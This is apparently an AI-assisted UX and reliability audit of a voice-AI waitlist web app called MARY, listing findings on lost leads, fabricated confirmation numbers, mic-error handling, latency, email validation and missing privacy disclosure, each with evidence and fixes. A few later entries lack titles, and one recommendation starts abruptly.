findings.title: Live site delivers zero leads: the Google Sheet is still not connected, so every lead lives only in the visitor's own browser
findings.evidence: GET https://omnisuite.omnikom.io/api/lead -> {"configured":false} on 2026-09-26 (leads lens at 03:10:39Z, scratchpad/ux-audit/leads/get-api-lead.txt; reliability and funnel lenses got the same result). src/routes/api/lead.ts:20,54-72: when not configured, nothing is written and the payload is not even logged. lead-lifecycle.ts:124-125 turns that into sync 'local'. PROJECT-STATE.md:64: the Apps Script is deployed, but setting SHEETS_WEBAPP_URL/SECRET has been pending since 2026-09-23, the conference day (.claude/POSITION.md 'conference is TODAY'). The only copy of a finished row is localStorage key 'omnisuite.waitlist.v1' (scratchpad/ux-audit/funnel/log-convo-ios.json). The owner view's own copy says 'entries stay on each visitor's device' (src/components/waitlist-vault.tsx:94). Safari ITP wipes script-written storage after 7 days without interaction (https://webkit.org/blog/10218/full-third-party-cookie-blocking-and-more/). In every finding, 'scratchpad' means /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad.
findings.user_impact: Every conversation since launch, including the 2026-09-23 conference, exists only on whichever phone had it. No server log or database holds it. The owner has 0 leads and doesn't know it, so the funnel's single outcome is lost.
findings.recommendation: Today: set SHEETS_WEBAPP_URL and a non-empty SHEETS_WEBAPP_SECRET in Lovable, then Publish -> Update. Confirm GET /api/lead returns configured:true, reachable:true, then run one real call end to end and watch the row appear. If a booth or demo device was used, open the owner view on it now (Ctrl/Cmd+Shift+O, or 5 taps on 'omnikom') and Export CSV before ITP clears it. In code: give /api/lead a server-side fallback store (Cloudflare KV/D1, or an email to the operator) so a lead never lives only in the browser. Add an uptime or CI check that fails when production reports configured:false. The planned Retell webhook also writes nothing when the sheet is unconfigured, so this is a Retell go-live gate too (UX-25).

findings.title: Every visitor is told 'Early access confirmed' with a made-up position number, whether or not anything was saved
findings.evidence: The position comes from positionFor() = 128 + hash % 640 (src/lib/waitlist-store.ts:122-126). It is frozen at the first local save, before any email is known, so it is seeded from the session id (:134). lead-lifecycle.ts:124-125: not configured -> sync 'local', position: entry.position. :129 falls back to the local number even when the sheet saves without a position. The copy 'EARLY ACCESS CONFIRMED / You're on the list / Invitations go out in order of position' is in conversation/text.ts:84-92. Screens: the same email got #327 on iPhone and #156 on desktop (scratchpad/ux-audit/funnel/shots/convo-ios-22-end-full.png, convo-desktop-21-end-settled.png). Another run showed #707 (reliability/s01-end-unconfigured.png). Another showed #149 while the payload sent localPosition 156 (leads/unconfigured-end-later.png, unconfigured.json). A repeat sign-up showed #690, then #250 (leads/again.json). With /api/lead returning 500, the screen says 'Your details are saved. Your position comes with the confirmation.' (reliability/s01-end-500.png, leads/lead500-end-later.png; end-screen.tsx:93-101). With a 12 s hang: 'Securing your place…', then the same 'saved' line (leads/leadhang-end-*.png). Callback with a 500: 'The team receives your request straight away' (leads/callback500-end-later.png; text.ts:69-71), and callbacks never show a sync state (end-screen.tsx:71). Spoken: the CALLBACK FINAL TURN says 'the request is with the team' and CLOSE says 'we'll be in touch' before any save (mary-prompt.server.ts:112; turn-runner.ts:180-184 -> lead-lifecycle.ts:238-276). That breaks the playbook rule 'Only say it's recorded after it actually saved' (docs/mary-voice.md:338). The live bundle /assets/routes-DZfdjxLS.js contains '128+t%640' and both strings.
findings.user_impact: While the sheet is off, every visitor who finishes leaves believing they hold a numbered spot, so they have no reason to retry or use another channel. The number changes every session, and anyone who compares numbers or never hears back loses trust. Even after UX-01 is fixed, any failed save still looks like a success (P1-level from then on), and callback requesters are told a person has their number.
findings.recommendation: Show 'confirmed' and a position only when sync === 'sheet' and the server returned a numeric position. Remove positionFor from the UI path (lead-lifecycle.ts:125/129). For 'local', 'failed' or pending, use honest copy ('Saving didn't go through yet — retrying' or 'We've got your details — we'll email you when early access opens'), a Retry button (the UX-06 outbox) and a prefilled mailto fallback, and drop the 'order of position' step. Handle the callback branch the same way. Make MARY's 'saved / with the team' lines depend on the save result, or change them to 'I'm sending this to the team now'. In Retell, MARY says a position only if save_lead returned one from the sheet (retell-migration.md:52-55), and the end screen follows the save_lead result.

findings.title: No fast lane: a visitor who gives name and email and wants to leave is recorded as 'declined' and told 'No spot reserved'
findings.evidence: Live call 3 (scratchpad/ux-audit/conversation/live-3.log). Person: 'I'm Dana. Look, I've only got a minute, can you just put me on the list? It's dana k at gmail dot com.' MARY: 'Yes, Dana — I'll keep this quick; I've got danak at gmail dot com.' / 'To finish, what's the business, roughly?' (mode=rushed). The fields required for complete include business, industry and operations: src/lib/mary-prompt.server.ts:90, gate text at :131-133 ('even if they ask you to finish now'), complete gated at :235, and src/features/mary/conversation/text.ts:55. Leaving counts as declined: mary-prompt.server.ts:119, :224-227. Probe: endingFor({declined:true, collected:{name,email}}) = 'declined' (probe-logic.out.json). The declined end screen says 'No spot reserved' (text.ts:76-81). After 'I've only got a minute', at least 3 more turns remain (reveal, lanes, wrap), plus 1-2 more to get business, industry and operations.
findings.user_impact: The visitors most likely to leave, rushed people at the stand, hand over their email and still walk away told 'No spot reserved', and their row lands as declined. Saying 'To finish' when 3-5 turns are left also breaks trust.
findings.recommendation: Make name + email the minimum sign-up. In mary-prompt.server.ts:90/217-218 and text.ts:55, set the required fields for `complete` to name+email, and flag the lead row as a partial profile when business, industry or operations are missing. Replace the gate text at :131-133 with: 'A spot is secured once you have their name and email… If they want to go and you have name and email: confirm the spot in one line and close. If you have no email yet: ask for it once, tied to the spot, then let them go.' In endingFor, 'leaving' with name+email present returns signed_up, not declined. The exact text is in scratchpad/ux-audit/conversation/proposed-prompt-edits.txt section 2. Port the same rule into the Retell agent.

findings.title: During an AI outage MARY loops on apologies, typed answers get no reply, and there is no way to leave details without AI
findings.evidence: Replay of the 2026-09-23 outage (.claude/POSITION.md:81: /api/turn 200 with {"type":"error"}, speech and transcribe 502, fallback server function 500). Screenshots: scratchpad/ux-audit/reliability/s02-error-line-1-welcome.png through -7 and s02-502-*.png. The opening line is 'Sorry — I lost my train of thought there. Could you say that once more?' (mary-stream.ts:126-128), cut off at 'Could you say' in the caption box. Every hold gets 'Didn't catch that. Hold, speak close to the phone' because a transcribe 502 is turned into '' (audio-engine.ts:2171). In the 502 variant every message gets 'I hit a snag on my side' (turn-runner.ts:34,185-186). Typed answers get no reply at all (see UX-16). When the tab closes, the beacon carries name '' and email '' (s02-error-line.json), so typed details are never extracted.
findings.user_impact: For the hours of an outage, every visitor gets a broken, apologising MARY with no voice and a hint to check their own volume. They can never finish, and the name and email they type are never captured.
findings.recommendation: Count consecutive turn failures in TurnRunner. After 2, replace the conversation with an inline form that needs no AI ('MARY's line is down — leave your name and email and the team will follow up') that POSTs to /api/lead. Add a cheap GET /api/health that checks the gateway, so the landing can offer 'type or leave details' before Start. Treat transcribe non-2xx responses and timeouts as a service error, not 'speak closer'. Alert on it (UX-35). The fallback is ours and must also cover Retell outages.

findings.title: The email is asked for last, after discovery, the reveal and the lanes pitch, so anyone who drops mid-call leaves no way to reach them
findings.evidence: Phase order: CONTACT is reached only after discoveryDone && revealed && lanesDone (src/lib/mary-prompt.server.ts:118-125). The playbook's own worked example asks for the email on MARY's 7th turn, after 5 visitor answers (docs/mary-voice.md:437-459). The reveal and lanes flags only count when 'Convert', 'Cultivate' and 'Recover' were heard in full (turn-runner.ts:167-170), so a cut-in pushes the email ask back further. In a mocked session that left after 2 answers, both the checkpoint and the abandoned beacon carried name and business but email '' and phone '' (scratchpad/ux-audit/leads/leave.json). Partial rows: lead-lifecycle.ts:219-235.
findings.user_impact: Someone who drops out at answer 1-5 (a loud floor, audio trouble, being pulled away) leaves a name and a company and no way to reach them. That row isn't a lead, even when the conversation went well.
findings.recommendation: Ask for the email right after the name. In rushed or leaving mode, ask immediately; otherwise ask at the peak, with the REVEAL followUp becoming 'That's the whole sign-up, by the way. Where should your invite go?' (mary-prompt.server.ts:121 and mary-voice.md §5, dropping the rule 'Never followed immediately by an ask'). LANES comes after it and is skipped when mode is rushed (UX-42). Optionally show a 'Leave your email' field from the first turn that writes through SET_COLLECTED. Add a unit test that pins the phase order. Proposed text: scratchpad/ux-audit/conversation/proposed-prompt-edits.txt section 3. Port the same order into the Retell prompt.

findings.title: A failed final save is sent once and never retried, and the per-IP limit can reject it at a busy venue
findings.evidence: finalize() posts one syncLead with a 9 s timeout (lead-lifecycle.ts:116-133; lead-sync.ts:77) and sets finished=true (:100). After that, flush() returns early (:146), so the pagehide beacon never resends. Checkpoints are fire-and-forget with a trailing debounce (:88-93), so in scratchpad/ux-audit/leads/lead500.json the only /api/lead POST of the whole conversation was the final one, at t=21.9 s. Measured causes of failure: the per-IP limit of 20/min (api-guard.ts:24) returned 429 from the 21st POST in a minute (leads/schema-probe.out.json). The Worker gives the sheet 9 s (lead.ts:63), while the Apps Script can wait up to 25 s for its lock (Code.gs:127). With /api/lead returning 500, the end screen still says 'Your details are saved' (reliability/s01-end-500.png).
findings.user_impact: One 429, 5xx, timeout or offline blip at the end of a call loses the finished status and whatever arrived in the last turns. That is often the email, which is asked last. The visitor is still told it saved. Conference Wi-Fi, where many visitors share one IP, and bursts of people finishing together make this more likely.
findings.recommendation: Add a localStorage outbox keyed by sessionId. Queue every payload and delete it only on saved:true. Retry with backoff (3 tries) while the page is open, send it with sendBeacon on pagehide, and replay it on the next load. Upserts by sessionId are already idempotent (Code.gs:173). Key the /api/lead rate limit by sessionId, or raise it, because a venue shares one IP. Turn the checkpoint into a throttle with a maximum wait instead of a pure debounce. While saving is pending or failed, show honest copy (UX-02). Retell adds retried webhooks for the voice path (UX-25), but the typing path and the end screen stay ours.

findings.title: Mic denied, missing or blocked by an in-app browser: the correct message is overwritten by a generic one that points to a mic button that doesn't exist, and Hold silently does nothing
findings.evidence: Three lenses reproduced this with getUserMedia rejecting NotAllowedError, and with mediaDevices undefined. The notice always reads 'I couldn't open the microphone. Tap the mic button to try again, or keep going by typing.' Sources: funnel log-deny-ios.json t=7232; reliability s04-mic-denied-1-after-welcome.png and s04-no-mic-1-after-welcome.png; mobile shots/inapp-denied-live-inapp-after-hold.png, shots/inapp-nomedia-local-inapp-after-hold.png and run-inapp-denied-live.txt (Instagram iOS user agent). Cause: start() and primeMicPermission set the specific 'denied' or in-app copy (mary-app.tsx:521; 602-606 at 5f531ad; text.ts:100-104). The hold effect then calls recorder.open() (mary-app.tsx:286-293 at 5f531ad). hold-recorder.ts:118 calls getUserMedia without wrapping the error, so micMessage(error) (mary-app.tsx:254) maps the raw DOMException to 'unknown' (text.ts:115-116) and overwrites the first message. Hold mode is the default and renders no mic button (composer.tsx:230; measured micButton=false). The 64px Hold button stays the main control, and each press calls getUserMedia again with no visible change (gum count 3; funnel shots/deny-desktop-11-deny-holding.png, deny-ios-10-your-turn.png). The status still says 'Hold the button while you talk', and the idle nudge says 'you can talk to me' (text.ts:138). The denied copy says 'Tap the mic button to ask again' (text.ts:106), but browsers do not re-prompt after a hard deny. Meta's Android apps don't grant the mic to their WebView (https://developers.facebook.com/community/threads/432379558191221). Chrome 151's <usermedia> element (2026-06-29) provides an in-page recovery flow, and Google Meet reported +131% successful permission recovery (https://developer.chrome.com/blog/usermedia-html-element). With Retell, a mic denial fires onError and then onEnd (docs.retellai.com/deploy/web-call).
findings.user_impact: Visitors who block the mic, and everyone arriving from Instagram or LinkedIn in-app browsers (a large share of waitlist traffic), get wrong instructions and keep pressing a Hold button that can never work. They never see the fixes that do work: open the page in a real browser, or type. Typing exists but is shown as secondary, so many leave.
findings.recommendation: (1) hold-recorder.ts:117-126: wrap getUserMedia and throw new MicUnavailableError(micFailureFrom(error)). Export micFailureFrom from audio-engine.ts and map a missing navigator.mediaDevices to 'unsupported'. Never overwrite a specific mic error with 'unknown', and add a unit test that calls micMessage with a raw DOMException. (2) Skip recorder.open() when the tap's primeMicPermission already failed (a c.micPrimeFailed flag set in start()), so the first message stands and no second prompt fires. (3) On denied, no-device or in-app, switch to typing first: hide or disable Hold, focus the textarea, add a small 'Try the mic again' link, and make micMessage mode-aware. Show per-browser steps (Safari: aA > Website Settings > Microphone > Allow; Chrome: lock icon > Microphone), and where supported (feature-detect), render Chrome's <usermedia> element in the notice. Keep the permissions-change listener that re-enables voice (mary-app.tsx:325-348). Have MARY say one line: 'Looks like I can't hear you — no problem, type below.' (4) With Retell, catch the mic-denial onError/onEnd and continue the same conversation in the /api/turn text chat. This UI stays ours.

findings.title: The first 16-18 s: about 4.5 s of silence after Start, then a 10 s jargon opener from the LLM before her first question
findings.evidence: Live measurements (funnel lens, 2 live calls): the /api/turn welcome gave its first 'say' at 2.98 s and finished at 4.15 s (scratchpad/ux-audit/funnel/turn-welcome.ndjson). /api/speech gave first audio at 1.28 s, and the 24-word line is 10.2 s of audio (speech-welcome.timing). Replayed in the browser: tap -> first word at +4.4-4.6 s on iPhone and desktop (log-voice-ios.json 4433 ms, log-voice-desktop.json). The welcome ends at +14 s, followed by a 1.8 s silent gap, because the follow-up TTS is only requested after the first line ends (turn-runner.ts delivers followUp after wait(260); audio-engine.ts speak() fetches per line with no prefetch). 'And what should I call you?' is audible at +15.8 s (iPhone) and the 'your turn' cue appears at +18.4 s (desktop). Conversation lens live call 1: opener first text at 4,638 ms, full at 5,806 ms. Cause: welcome() runs a full LLM turn with forceReasoning (turn-runner.ts:52-54; mary-app.tsx:533; src/routes/api/turn.ts:48-49), although fixed openers already exist (src/lib/retell-shared.ts:38-42). Content: the live opener is 'Hi there. I'm MARY, Omnikom's AI Revenue Concierge. OmniSuite is our AI and human revenue engine.' / 'And what should I call you?'. The WELCOME instruction mentions no waitlist, benefit or time (mary-prompt.server.ts:116; mary-voice.md:276-297), and DISCOVER says 'never mention the waitlist offer again' (:119). The landing previews a different line, 'Hi, I'm MARY. Want first access to OmniSuite through the launch waitlist?' (landing.tsx:9). In live call 2 the visitor's first question was 'what is this exactly? What am I signing up for?'. For comparison, ElevenLabs' demo went from mic request to first agent audio in about 1.75 s with a static 12-word greeting that ends in a question (scratchpad/browser/log-agents-ios.json: getUserMedia t=13947, audio_event t=15693). Real iPhones add the permission sheet on top of all this.
findings.user_impact: This is the most fragile moment. Visitors see '…' / 'Thinking… hold to talk' and hear nothing for about 4.5 s, then 10 s of category words before anyone asks them anything or tells them what they get. This is where people give up, start tapping (UX-09), or spend a turn asking what this is.
findings.recommendation: Make turn 1 a fixed line with 3-4 variants, e.g. 'Hi, I'm MARY. I look after early access for OmniSuite, Omnikom's new revenue engine.' / 'Two minutes with me and you're on the list. What should I call you?'. Ship its audio as pre-rendered static files on the CDN (no per-visit TTS cost) and play it from the Start tap. Fetch turn 2's context in parallel, and request the follow-up TTS while the first line is still playing. Target: first audible word in under 1 s. Delete 'never mention the waitlist offer again' and make the landing preview bubble match the real opener. With Retell: use a static begin message (start_speaker agent), never an LLM-generated first turn; a dynamic opener also triggers the 10 s minimum charge (https://docs.retellai.com/accounts/billing-exceptions). Retell staff said in a community thread on 2026-09-17 that the first packet reaches the browser about 1250 ms after the agent starts talking. So test begin_message_delay_ms at about 1000-1500 to avoid clipping the first word (the market lens proposed 0 with the opening_line variable; measure both).

findings.title: A tap or brush on the big Hold button while MARY talks or thinks cuts her off, drops her question and loses what the visitor said
findings.evidence: Live site, iPhone profile (scratchpad/ux-audit/funnel/tap-test.mjs): a 120 ms tap 5 words into the welcome cut her to 'Hello. I'm MARY, Omnikom's …'. No follow-up was spoken and nothing happened for 8 s (the /api/speech count stayed at 1). Screenshot: shots/tap-ios-after-tap-during-welcome.png. Reliability (mocked): a 150 ms brush during the greeting stopped her at 'Hi,…' and she never asked her question (s04-brush-while-speaking-1.png). A 150 ms tap while she was thinking about 'My name is Sam Rivera' got no reply ever: the name was not saved (localStorage empty) and no checkpoint was sent (s04-tap-while-thinking-2-after.png, -3-plus20s.png). Cause: onPress calls runner.interrupt() before the hold is known to be real (mary-app.tsx:184-191; turn-runner.ts:78-81, 99). The follow-up is then dropped ('if (turn.followUp && !deps.isHeld())'). A hold under MIN_HOLD_MS (300 ms) only calls onCancel -> waiting(), with no notice (hold-talk.ts:4,123-124 and 494-497; mary-app.tsx:175-179,196). SET_COLLECTED runs after the stale check (turn-runner.ts:127,146-148). The button is a 64 px full-width bar in the thumb zone, labelled 'Hold to talk to MARY' even while she speaks (composer.tsx:83, 94-98).
findings.user_impact: Tapping is the natural gesture on the screen's biggest control. Anyone who taps it, or rests a thumb near it, in the first 15 s loses her name question and sees half a sentence with no next step. Details they already gave are discarded, so she has to ask again.
findings.recommendation: On press, pause her line rather than stopping it. Commit runner.interrupt() only once the hold passes MIN_HOLD_MS and produces words. Treat a shorter press as a no-op plus a hint ('Press and hold while you speak'). On onCancel or onMissed, resume the paused line or re-run the dropped turn; if she was cut off with no user text, repeat her last question. Always apply turn.collected, even when the turn is stale. Show the button as 'MARY is talking…' (dimmed) until her turn ends (see UX-47). With Retell's open mic (UX-48) the hold button goes away, but any 'noisy room' hold mode that stays needs the same guard.

findings.title: MARY promises an early-access confirmation email that nothing ever sends
findings.evidence: The email ask is 'So I know where to send your early-access confirmation — best email?' (docs/mary-voice.md:193, 459, 509; mary-prompt.server.ts:125). Her answer to data questions is 'Only to confirm your spot and send your launch details' (mary-voice.md:386). The end screen says 'Your position comes with the confirmation' (end-screen.tsx:100). A grep for MailApp/GmailApp/sendEmail/resend/sendgrid/postmark/smtp in src/ and docs/google-sheets/Code.gs finds nothing. The Retell plan's fallback line also tells visitors 'the team will confirm by email' (scratchpad/retell/plan.md:491). Best practice is to send the confirmation immediately (https://21st.dev/blog/react-waitlist-page-components, 2026-08-20), and confirmation emails see 75-90% open rates (https://getlaunchlist.com/blog/waitlist-email-templates-that-get-opened, updated 2026-04-24). The Apps Script MailApp quota is 100 recipients/day on a consumer account and 1,500 on Workspace (https://developers.google.com/apps-script/guides/services/quotas, updated 2026-09-03).
findings.user_impact: Every signed-up visitor waits for an email that never arrives, so they have nothing in their inbox to prove the sign-up or find the product again. A misheard email is never caught, because nothing is ever sent that could bounce.
findings.recommendation: Send a confirmation the first time a row reaches signed_up or callback. The simplest place is Apps Script MailApp inside upsertLead, which already detects that transition (Code.gs:218-224); a transactional provider called from the Worker also works. Include the name, captured details, the real position, 'reply to fix anything' and one next step (a share link, UX-53). Show 'Check your inbox' on the end screen. With Retell, send it from the same upsert (or call_analyzed) and optionally add call_summary as a recap. Until it is live, change the ask to 'so your invite has somewhere to go' in the prompt and in the Retell port.

findings.title: Emails are never validated, read back or correctable: grounding accepts an invented domain, and the visitor can't fix a misheard address
findings.evidence: Grounding accepts the whole email when only its local part (length >= 2) appears anywhere in what the visitor said (src/lib/mary-grounding.ts:298-304). Probe: the user said 'Sarah.' / 'Just use my work email.', the model proposed 'sarah@gmail.com', and it was accepted (scratchpad/ux-audit/conversation/probe-logic.out.json). The schema is email: z.string().max(200) (src/lib/lead-sync.ts:21), and the local /api/lead accepted 'sam at example' (leads/schema-probe.out.json). The Retell argument schema is the same arg(200) (src/lib/retell-shared.ts:149). Live call 3 turned 'dana k at gmail dot com' into 'danak@gmail.com' and moved on without checking. The spec shows a read-back in one example (mary-voice.md:461), but no rule requires it. 'Details confirmed' on the end screen is a static list with no edit option (end-screen.tsx:156-173). The only action, 'Start another conversation', calls newSession() and reloads (mary-app.tsx:591-595), which creates a duplicate row. Retell recommends reading back and spelling critical details (Agent Handbook 'Echo Verification' / 'NATO Phonetic Alphabet', https://docs.retellai.com/build/agent-handbook; email-spelling pattern at https://docs.retellai.com/build/prompt-situation-guide).
findings.user_impact: A wrong or invented address is shown as 'Details confirmed' and stored, so the lead can't be reached even though the visitor did everything right. Nobody notices until launch mail bounces, and the only way to correct it creates a duplicate.
findings.recommendation: Require an x@y.tld format, and require the domain tokens to appear in what the visitor said (in groundCollected and in LeadPayloadSchema). A value that fails goes back to MARY as rejected so she asks again. Add to the CONTACT beat: read it back in chunks, spell anything that isn't an ordinary word, then ask 'Did I get that right?' (the one allowed confirmation question); if it is wrong twice, ask them to type it. Show an email input on screen during the email ask (keyboard attributes in UX-52). Add an 'Edit' / 'Fix a detail' action on each confirmed field that re-syncs the same sessionId row through /api/lead. In Retell, enable Echo Verification and make the email pill tappable for typed correction (UX-24).

findings.title: No notice before the mic opens that MARY is an AI, that the call is recorded and transcribed, or how the data is used; no privacy link
findings.evidence: A grep over src/features, src/components and src/routes for privacy|terms|recorded|recording|consent finds no user-facing hits (landing.tsx:139-165, site-frame.tsx:30-49, call-stage.tsx). The live landing has 0 links (scratchpad/ux-audit/funnel/log-landing-ios.json; market/shots/mary-live-landing-ios.png). Tapping Start requests the mic at once (mary-app.tsx:517-525). What is actually captured: the full transcript, name, email, phone, user agent, referrer and timezone go to the sheet (lead-sync.ts browserContext; lead-lifecycle.ts:52-78; Code.gs:43-72). Transcripts go to /api/reflect to create 'lessons' (mary-app.tsx:95-119). Partial transcripts are sent by beacon as 'abandoned' when the tab closes. Audio goes to the Lovable AI gateway (routes/api/transcribe.ts). Retell: data_storage_setting defaults to 'everything' (recordings + transcripts; https://docs.retellai.com/api-references/create-agent, /create-web-call, /accounts/privacy-disable), and data is kept indefinitely unless a retention period is set (https://docs.retellai.com/accounts/data-retention). The Retell plan ships 'everything' and lists disclosure as an open question (scratchpad/retell/plan.md:981,1139). Retell's ToS (updated 2026-06-01) says the customer must disclose recording and obtain any required consent 'before or at the start of the call', and calls may be used for training unless opted out (retellai.com/legal/terms-of-service). EU AI Act Art. 50 transparency duties have applied since 2026-08-02 (labs.cloudsecurityalliance.org note 2026-07-29; digital-strategy.ec.europa.eu FAQ). 11 US states require all-party consent to recording (https://justcall.io/blog/ai-voice-agent-disclosure-laws.html, updated 2026-09-22). ElevenLabs requires the notice 'immediately prior to any interaction' (elevenlabs.io/docs/eleven-agents/legal/disclosure-requirement), and its demo shows an 'I agree' sheet (scratchpad/browser/terms-agents-ios.png). Sesame links Terms and Privacy before the call (market/shots/sesame-ios.png). Vapi's widget has require-consent.
findings.user_impact: Business visitors, the target audience, are asked for email and phone by a voice bot with no word on recording or data use, which hurts trust at the moment of commitment. It can block legal sign-off for EU and California visitors, and once Retell records by default it breaks the vendor's terms.
findings.recommendation: Add one quiet line under the Start and Type buttons, before any audio: 'MARY is an AI. Your conversation is recorded and transcribed to set up your spot. Privacy →'. Keep it inline, not a blocking modal, so Start stays one tap. Link a short privacy page from SiteFooter covering what is kept, where (Google Sheet, AI providers, Retell), for how long, and who to contact to delete it. Keep the AI mention in her opener and in Retell's begin message. For Retell, choose data_storage_setting deliberately ('everything_except_pii', or pii_config at +$0.01/min per https://www.retellai.com/pricing), set data_storage_retention_days (e.g. 90), opt out of training if unwanted, and make the wording match what is actually stored.

findings.evidence:
Portrait (visual lens, live, 390x844, scratchpad/ux-audit/visual/caption-seq-390.json): the caption box has scrollHeight 182 vs clientHeight 136. The 'You · …' echo

is squashed to 0 px, and 'Show conversation' starts at top 142 in a 136-px box, so it is hidden. Shots: visual/shots/390x844-light-7-call-long-caption.png and 375x667-light-7-call-long-caption.png. In the repo build the echo is clipped on both sides and starts mid-word, 'Realty, we're…' (visual/repo/repo-390x844-light-7-call-long-caption.png). Keyboard (mobile lens, visualViewport 420 and 360 px through the use-viewport.ts:27-49 path): the caption box is 0 px tall and 'And what should I call you?' sits at y=324-354, fully clipped (currentLineVisible=false), on the branch, on live and on Android Chrome (mobile/shots/keyboard-ios-local-keyboard-360.png, keyboard-ios-live-keyboard-360.png, keyboard-android-local-keyboard-360.png). Landscape: caption height 0 at 750x342 (mobile/shots/landscape-local-after-welcome.png, landscape-live-after-welcome.png) and at 844x390 and 667x375 (visual/shots/safe/landscape-844x390-call.png). The 140 px minimum orb (mary-app.tsx:735-736) overlaps the progress pills. The landscape landing has scrollHeight 553 with the CTA at 431-487, below the fold (visual/shots/safe/landscape-844x390-landing.png). Code: call-stage.tsx:194/:211 has a fixed h-[10.5rem] plus overflow-hidden (live: h-[8.5rem]) inside a flex-1 min-h-0 area (:203); :214 has a 'max-w-xl truncate' echo in an items-center column. Safari iOS ignores interactive-widget (MDN browser-compat-data 8.1.3, 2026-09-24), so the JS hook is the only thing adapting the layout.
findings.user_impact: On most two-beat turns, phone visitors can't read what they just said, and the only way to open the transcript disappears. Anyone typing on a phone (Type instead, spelling an email) or holding it sideways can't see the question they are answering. A voice UI that loses the words looks broken.
findings.recommendation: In call-stage.tsx, replace the fixed height: give the caption area flex-1 min-h-0 with its own overflow-y-auto anchored to the newest line, or a top fade mask (styles.css:174 has an unused trail-fade utility), so the current question always renders directly above the composer. Give the echo shrink-0 max-w-full line-clamp-1. Clamp the current line to line-clamp-3 and the previous line to line-clamp-1, hidden below sm. Move 'Show conversation' out of the clipped box, into the header or a chip beside the composer. When keyboardHeight is set or the height is under about 480 px, hide the pills and the previous line and shrink the orb to a 40-48 px avatar (change the Math.max(140) floor at mary-app.tsx:736). Also account for visualViewport.offsetTop in use-viewport.ts. Add a two-column layout for (orientation: landscape) and (max-height: 500px), with orb and caption on the left and the composer on the right, and keep the landscape CTA above the fold. Do this on the reconciled live layout (UX-14).

findings.evidence: scratchpad/ux-audit/visual/drift.mjs compares the live bundle visual/live/routes-DZfdjxLS.js (downloaded 2026-09-26) with src/features/mary/ui/* and finds 44 live-only classNames. `git log --all -S` finds none of them in any ref, including origin/main 44318ba, PR #2 5f531ad and the archive tags. Examples: caption 'flex h-[8.5rem] ... sm:h-[11rem]' live vs h-[10.5rem] in the repo (call-stage.tsx:211); header 'min-h-12 shrink-0 items-center gap-2 sm:min-h-14'; call section px-3; textarea 'text-sm' live vs 'text-base … sm:text-sm' in the repo (composer.tsx:284; see UX-51); 'Start another conversation' min-h-11 live vs text-xs in the repo (end-screen.tsx:180; a 150x16 target, visual/repo/run-repo-390x844-light.json); status line text-[0.62rem] live vs 0.7rem (composer.tsx:303). Measured at 390x664: live shows 'And what should I call you?' (mobile/shots/portrait-live-after-welcome.png), while the branch clips it (portrait-local-after-welcome.png, currentLineVisible=false). On iPhone SE 375x548 the live Start button is at y=457-505 (funnel log-landing-se.json), while the branch puts it at y=568-624, entirely below the fold (mobile/run-se.txt, shots/se-local-landing.png). The live audio chunk audio-engine-I_qx9wg2.js has PR #1's marker (sinkElement) but not PR #2's (wakeLock, elementRestarted). So live = PR #1 audio plus Lovable-side UI edits that were never synced.
findings.user_impact: Every UI fix made in GitHub, including PR #2 and the Retell UI work, starts from a baseline visitors don't see. Publishing the branch would replace the compact layout the operator just checked on the iPhone: SE visitors would lose the above-the-fold Start button, and iPhone 13 visitors would lose sight of MARY's first question. Alternatively, Lovable's edits could overwrite fixes made in the repo.

Rebase PR #2 on the result. Re-run `node mobile.mjs portrait` and `node mobile.mjs se` against the Lovable preview before Publish -> Update. Add a CI check or checklist step that compares the deployed bundle hash with the build of main.

findings.title: Every turn takes 2.4-7.6 s to MARY's first text, before speech-to-text and TTS are added, with only a thinking orb in the meantime
findings.evidence: Live /api/turn timings (scratchpad/ux-audit/conversation/live-1..4.log), time to first 'say' / full turn: opener 4,638/5,806 ms; 'what is this' 2,655/4,325 ms; early leaver 2,356/3,662 ms; dump+price 7,617/9,728 ms. This excludes /api/transcribe before and TTS after (TTS first audio 1.28 s, funnel speech-welcome.timing). Causes: forceReasoning (src/routes/api/turn.ts:48-49); a 24-field schema whose followUp can only be spoken once the whole object is done (mary-prompt.server.ts:22-67; turn-runner.ts:155-157); and only a 'thinking' orb in the meantime (turn-runner.ts:100). Once the sheet is configured, experienceForTurn can add up to 900 ms on a cache miss (src/lib/mary-experience.server.ts:258-288). Budget: 'roughly 800 milliseconds before a conversation starts to feel slow' (https://webrtc.ventures/2026/09/voice-ai-latency-budget/, 2026-09-23). Retell: the vendor figure is about 600 ms; the independent median time to first audio is 1,740 ms (https://openbenchmarks.com/voice-agent-latency/retell).
findings.user_impact: After every answer there are 4-8 s of silence, plus transcription and speech time. In a loud room people repeat themselves or walk off, and the call runs past the promised two minutes.
findings.recommendation: For the typing path, which keeps /api/turn after Retell: drop forceReasoning or use a faster model for turns, and move the evidence fields behind say/followUp in the schema so followUp is final before the bookkeeping is written. Keep experienceForTurn off the hot path, or cache it. In Retell, measure time to first audio on real devices rather than trusting the vendor figure, and add filler speech while tools run (UX-55).

findings.title: The near-repeat filter over-fires on normal short replies, adds an extra LLM call, and can swallow her reply entirely, leaving 'Thinking…' forever
findings.evidence: isNearRepeat (src/features/mary/conversation/text.ts:33-48) divides by the shorter line. Probe (scratchpad/ux-audit/conversation/probe-logic.out.json): 'Good to meet you, Sarah.' after 'Hey — good to meet you. I'm MARY…' counts as a repeat, and that is the playbook's own example (mary-voice.md:439-443). So do 'Got it.', 'Fair.', 'You're all set.' and 'I'll be quick.' whenever an earlier line contains them. A flagged say is suppressed (turn-runner.ts:124) and triggers a second, non-streamed LLM call (:129-145; full turns measured at 3.7-9.7 s). The retry injects REPEAT_NUDGE as a user line, '(You just repeated yourself…)' (:35-36), which the prompt renders as 'Person:'. The followUp itself is never checked for repeats. If the retry fails or is still a near-repeat, the reply is skipped (turn-runner.ts:129-152), and nothing resets presence from 'thinking' (set at :100). The reliability screenshots s02-error-line-4-typed1.png, -5-typed2.png, -6-typed2-plus15s.png and -7-typed3.png show no MARY line, a '…' caption and 'Thinking…' 15+ s after each typed answer (network: /api/turn, then the /_serverFn retry fails, then nothing is spoken).
findings.user_impact: Ordinary turns get several extra seconds of silence. She may apologise to the visitor for a complaint they never made. In the worst case, including with a healthy gateway if the model repeats itself twice, the visitor types, sees '…' forever and doesn't know whether to wait, retype or leave. Meanwhile a real repeated question still gets through.
